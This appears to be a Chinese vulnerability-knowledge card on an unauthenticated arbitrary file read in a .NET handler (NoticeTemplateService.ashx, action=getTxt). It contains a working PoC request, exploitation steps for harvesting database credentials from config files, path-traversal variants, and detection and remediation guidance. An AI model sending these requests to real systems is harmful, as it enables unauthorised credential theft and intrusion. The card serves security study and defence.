---
id: web-generic-file-inclusion-dotnet-handler-gettxt-path-read
title: .NET Handler getTxt 的 path 直拼 FileStream：读取 web.config 等任意站点文件
type: scenario
domain: web
path: web/generic/file-inclusion
technique: dotnet-handler-gettxt-arbitrary-file-read
aliases:
- 智慧校园任意文件读取
- NoticeTemplateService getTxt
- path 参数文件读取
- FileStream 任意读
- web.config 读取
tags:
- file-read
- dotnet
- ashx
- filestream
- path-traversal
- web-config
- iis
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V38
  verified_at: '2026-11-05T06:02:53+08:00'
  notes: 已通读原文并逐张核对19张图：NoticeTemplateService getTxt 分支第905-916行 strPath=Request.Params[path] 直接 BaseDirectory+strPath 传入 FileStream(Open,Read,ReadWrite)、StreamReader UTF-8 读出并 Response.Write；实测 path=/web.config 返回完整 web.config XML（connectionStrings/appSettings configSource），无鉴权无路径校验，与卡一致；卡内 ..\ 穿越为合理变体未在原文验证。frontmatter 无 sources/source_url；未在本机复跑。
---

## 一句话结论

某智慧校园系统的 `NoticeTemplateService.ashx` 在 `action=getTxt` 时把请求参数 `path` 直接拼到站点根目录后交给 `FileStream` 读取：`new FileStream(AppDomain.CurrentDomain.BaseDirectory + strPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)`，再用 `StreamReader` 以 UTF-8 读出并 `Response.Write` 回显；没有路径白名单、没有目录限制、没有后缀校验。文章用 `path=/web.config` 直接读出了 Web.config 内容，任意可读文件（连接串、配置、源码、日志）都可被未授权读取。

## 原理

- 入口：`NoticeTemplateService`（`IHttpHandler`）的 `ProcessRequest` 中，`action == "getTxt"` 时进入漏洞分支。
- 代码：`string strPath = context.Request.Params["path"];` → `FileStream fileStream4 = new FileStream(AppDomain.CurrentDomain.BaseDirectory + strPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);` → `StreamReader` 读取全部 → `context.Response.Write(strContent4);`。
- 路径拼接只做字符串相加：`BaseDirectory` 形如 `C:\inetpub\wwwroot\`，`strPath` 为 `/web.config` 时得到 `C:\inetpub\wwwroot\/web.config`（Windows 下等价站点根下 web.config）；若传入 `..\..\Windows\win.ini` 或 `..\..\inetpub\logs\...`，字符串拼接可穿越到上级目录，具体可读范围取决于 IIS 进程账户权限。
- 没有任何校验：没有 `Path.GetFullPath` + 前缀判断，没有扩展名白名单，没有拒绝 `..`/绝对路径，也没有把结果限制在模板目录。
- `FileShare.ReadWrite` 允许读取正在被其它进程写入/占用的文件（如日志、锁文件），提高成功率。
- 读取结果直接写回响应，攻击者无需盲读；`Response.Write` 以文本方式输出，二进制文件可能乱码但通常仍可下载/还原。
- 根因是“文件路径由客户端完全控制且未做规范化/白名单”，属于典型的任意文件读取（path traversal / arbitrary file read）。

## 触发条件

- 目标为该智慧校园系统，`NoticeTemplateService.ashx` 可访问（文章路径为 `/ashx/DZBP/NoticeTemplate/NoticeTemplateService.ashx`）。
- `action=getTxt` 与 `path` 参数可控，Handler 未继承 `HandleBase` 或未做鉴权（文章请求未带 token）。
- IIS 应用池账户对目标文件有读权限（web.config、站点源码、日志通常可读；系统文件取决于账户权限）。
- 应用未对响应做编码/二进制包装（文本文件直接回显；二进制可能需另存）。

## 利用步骤

1. 请求 `POST /ashx/DZBP/NoticeTemplate/NoticeTemplateService.ashx`，body `action=getTxt&path=/web.config`。
2. 观察响应是否为 Web.config 的 XML 内容（文章截图返回 `<configuration>...<connectionStrings configSource="config/Web.Connection.config">` 等），确认任意文件读取。
3. 读取连接串配置文件（`config/Web.Connection.config`）、应用配置（`Web.AppSettings.config`）、日志、源码/备份文件，收集数据库凭据与密钥。
4. 用 `..\` 逐级穿越尝试读取站点目录外文件（如 `..\..\Windows\win.ini`、IIS 日志、其他站点配置），根据进程账户权限确定边界。
5. 若读到的连接串可登录数据库、或配置中有机器密钥/上传目录信息，结合其它漏洞（上传、SQL 注入）扩大影响。

## PoC

```http
POST /ashx/DZBP/NoticeTemplate/NoticeTemplateService.ashx HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

action=getTxt&path=/web.config
```

```text
响应（文章截图）：
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <configSections>...</configSections>
  <connectionStrings configSource="config/Web.Connection.config"></connectionStrings>
  <appSettings configSource="config/Web.AppSettings.config"></appSettings>
  ...
</configuration>

代码路径：
strPath = Request.Params["path"]                       // "/web.config"
FileStream(BaseDirectory + strPath, Open, Read, ReadWrite)
StreamReader(...).ReadToEnd() -> Response.Write        // 原文回显

文章附请求/响应截图；本卡未在本机复现。
```

## 变体与关联

- 变体（路径穿越）：`path=/../web.config`、`path=..\..\Windows\win.ini`、`path=..\..\..\inetpub\logs\LogFiles\...`；Windows 同时接受 `/` 与 `\`，可混合使用。
- 变体（敏感目标）：`config/Web.Connection.config`（数据库连接串）、`Web.AppSettings.config`、`bin/*.dll.config`、IIS 日志、备份 `.zip/.bak`、`machine.config`、其他站点目录。
- 变体（输出方式）：文本文件直接回显；二进制文件可被 `StreamReader` 以 UTF-8 读出后乱码，必要时用其它接口或分段读取还原。
- 关联：[[web-generic-file-inclusion-windows-sam-ntlm-crack]] 是 Windows 下读 SAM 的另一路径；本卡是 .NET Handler 的 `path` 直拼 `FileStream`。
- 关联：[[web-generic-file-inclusion-java-new-file-root-path-traversal-read]] 是 Java 侧同类“路径拼接未规范化”模式，可对照审计。
- 边界：若应用池账户对目标文件无读权限、或修复为 `Path.GetFullPath` + 根目录前缀校验 + 扩展名白名单，链路失效；`BaseDirectory` 拼接对绝对路径（如 `C:\...`）会得到非法路径，但 `..\` 穿越仍有效。

## 检测与防御

- 请求检测：`path` 参数出现 `..`、`%2e%2e`、`/web.config`、`\windows\`、`.config`、`.dll`、`.log`、`.bak`、`/etc/passwd`；`action=getTxt` 且 `path` 以 `/` 或 `\` 开头；同一来源批量读取不同路径。
- 主机检测：IIS 进程读取站点根目录外的文件；`web.config`/`config/*.config` 被非配置加载路径读取；应用日志出现 `FileStream` 打开失败/拒绝访问（说明在探测）。
- 修复：`path` 只接受模板 ID/文件名白名单，服务端映射到固定目录；用 `Path.GetFullPath` 规范化后校验以模板根目录为前缀，拒绝 `..` 与绝对路径。
- 修复：限制可读扩展名（如仅 `.txt`/`.html`）与最大长度；不要用 `BaseDirectory + 用户输入` 直接构造路径。
- 加固：应用池账户最小权限，禁止读取系统目录与其它站点；敏感配置用 DPAPI/密钥管理加密；WAF 拦截路径穿越特征；对 Handler 接入统一鉴权。
- 审计：搜索 `FileStream`、`StreamReader`、`File.ReadAllText`、`Path.Combine` 的用户输入来源；检查是否有 `GetFullPath` + 前缀校验；检查 `.ashx` 是否继承鉴权基类。
